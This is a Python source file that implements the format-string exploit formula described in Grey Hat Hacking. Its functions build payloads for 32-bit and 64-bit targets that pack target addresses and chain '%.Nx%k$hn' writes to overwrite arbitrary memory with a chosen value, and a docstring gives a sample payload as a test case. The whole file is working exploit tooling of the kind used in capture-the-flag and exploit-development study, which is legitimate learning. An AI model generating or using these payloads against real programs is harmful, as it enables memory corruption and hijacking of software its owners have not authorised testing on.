"""This is just a super quick implementation of the string format formula described in
Grey Hat Hacking, The Ethical Hacker's Handbook """
import argparse
import struct


def main(args):
    value_to_write = args.value_to_write
    offset = 1
    if args.offset is not None:
        offset = args.offset

    print(create_format_string(value_to_write, offset))


def create_format_string(value_to_write, offset=1):
    shell_string = ""
    if type(value_to_write) == int:
        value_to_write = hex(value_to_write)

    if value_to_write[:2] == "0x":
        value_to_write = value_to_write[2:]
        remainder = (len(value_to_write) % 4)
        if remainder > 0:
            value_to_write = ("0" * (4 - remainder)) + value_to_write

    low_order_bytes = 0
    high_order_bytes = 0
    if len(value_to_write) == 8:
        low_order_bytes = int(value_to_write[4:], 16)
        high_order_bytes = int(value_to_write[:4], 16)
    elif len(value_to_write) == 4:
        low_order_bytes = int(value_to_write, 16)
        high_order_bytes = 0

    if ((low_order_bytes < high_order_bytes) or (low_order_bytes == high_order_bytes)) \
            and len(value_to_write) == 8:
        format_string = "%.{:d}x%{:d}\\$hn%.{:d}x%{:d}\\$hn".format(
            low_order_bytes - 8,
            offset + 1,
            high_order_bytes - low_order_bytes,
            offset)
        shell_string = "{:s}{:s}".format(shell_string, format_string)
    elif (low_order_bytes > high_order_bytes) and len(value_to_write) == 8:
        format_string = "%.{:d}x%{:d}\\$hn%.{:d}x%{:d}\\$hn".format(
            high_order_bytes - 8,
            offset,
            low_order_bytes - high_order_bytes,
            offset + 1)
        shell_string = "{:s}{:s}".format(shell_string, format_string)

    if len(value_to_write) == 4:
        shell_string = shell_string + "%.{:d}x%{:d}\\$hn".format(
            low_order_bytes - 4,
            offset)

    return shell_string


def make_x86_payload(address_to_write_to, value_to_write, offset=1):
    """I really just want something that I can import into another script;
    this is that"""
    payload = struct.pack('<I', address_to_write_to)
    if value_to_write > 0xffff:
        payload += struct.pack('<I', address_to_write_to + 2)
    payload += create_format_string(value_to_write, offset).encode()
    return payload


def new_make_fmt_string(address_to_write_to, value_to_write, offset=1):
    """
    test casenew_make_fmt_string(0x080497ac, 0xffffd258)
    should output b'\xae\x97\x04\x08\xac\x97\x04\x08%.54844x%2\$hn%.10683x%1\$hn'
    :param address_to_write_to:
    :param value_to_write:
    :param offset:
    :return:
    """
    val = value_to_write
    address_size = 4
    pack_symb = '<I'
    if address_to_write_to > 0xffffffff:
        address_size = 8
        pack_symb = '<Q'
    payload_values = list()
    original_index = 0
    while val > 0:
        payload_values.append((val & 0xffff, original_index))
        val = val >> 16
        original_index += 1
    # sorted by value from least to greatest, add the preserved index to the calculated offset
    payload_values.sort(key=lambda a: a[0])
    payload_values = [(address_to_write_to + (indx * 2), (value - (indx * address_size), indx + offset))
                      for value, indx in payload_values]

    if len(payload_values) > 1:
        temp_payload_vals = [payload_values[0]]
        for indx in range(1, len(payload_values)):
            # only modify the value for the number of 0s printed
            temp_payload_vals.append((payload_values[indx][0],
                                      (payload_values[indx][1][0] - payload_values[indx - 1][1][0],
                                      payload_values[indx][1][1])))
        payload_values = temp_payload_vals

    payload = b''
    format_string = b''
    template_format = r"%.{:d}x%{:d}\$hn"
    for write_addr, arguments in payload_values:
        payload += struct.pack(pack_symb, write_addr)
        format_string += template_format.format(*arguments).encode()

    payload += format_string
    return payload


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    # parser.add_argument("--address", "-a", type=str, help="Address that has to be printed out via python")
    parser.add_argument("--offset", "-o", type=int, help="The offset of the address on the stack")
    parser.add_argument("value_to_write", type=str, help="Value to write, big endian, 0xffffffff or 0xffff format")
    args = parser.parse_args()
    main(args)
